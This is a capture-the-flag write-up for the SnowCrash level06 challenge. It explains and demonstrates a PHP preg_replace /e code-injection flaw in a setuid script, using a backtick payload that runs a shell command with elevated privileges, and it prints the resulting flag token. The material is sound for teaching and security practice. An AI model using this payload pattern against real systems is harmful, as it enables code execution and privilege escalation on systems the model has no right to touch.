Level06 - PHP Regex Code Injection (preg_replace /e Vulnerability)Overview

Overview
This level demonstrates exploitation of the deprecated /e modifier in PHP's preg_replace() function, which evaluates the replacement string as PHP code. This creates a critical code injection vulnerability.
Solution Steps
Step 1: Enumerate Files
List files in the level06 directory:

```sh
level06@SnowCrash:~$ ls -l
```

**Output:**
```sh
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwsr-x---  1 flag06 level06  356 Mar  5  2015 level06.php
```
Key observation: Both files are owned by flag06 and have setuid permissions, meaning they run with elevated privileges.

Step 2: Analyze the PHP Script
Examine level06.php:
```sh
level06@SnowCrash:~$ cat level06.php
```

Script breakdown:

```php
#!/usr/bin/php
<?php
    function y($m) {
        $m = preg_replace("/\./", " x ", $m);    # Replace '.' with " x "
        $m = preg_replace("/@/", " y", $m);       # Replace '@' with " y"
        return $m;
    }
    
    function x($y, $z) {
        $a = file_get_contents($y);               # Read file content
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  # VULNERABLE!
        $a = preg_replace("/\[/", "(", $a);       # Replace '[' with '('
        $a = preg_replace("/\]/", ")", $a);       # Replace ']' with ')'
        return $a;
    }
    
    $r = x($argv[1], $argv[2]);                   # Execute with command-line arguments
    print $r;
?>
```

Step 3: Identify the Vulnerability
Critical line:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The /e modifier vulnerability:

Deprecated since PHP 5.5.0 and removed in PHP 7.0
Causes the replacement string to be evaluated as PHP code
Pattern: /(\[x (.*)\])/e matches [x anything]
The captured content (.*) is passed to function y() and executed

Exploitation vector:
If we create a file containing [x {malicious_code}], the code will be executed as PHP.

Step 4: Craft the Exploit
Create a file with PHP code injection payload:

```sh
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/exploit
```

Payload explanation:

[x ...] - Matches the vulnerable regex pattern
${getflag} - PHP complex variable syntax with command execution

Backticks execute shell command getflag
The ${} syntax ensures it's evaluated as PHP code

Step 5: Execute and Retrieve the Flag
Run the vulnerable script with our malicious file:

```sh
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```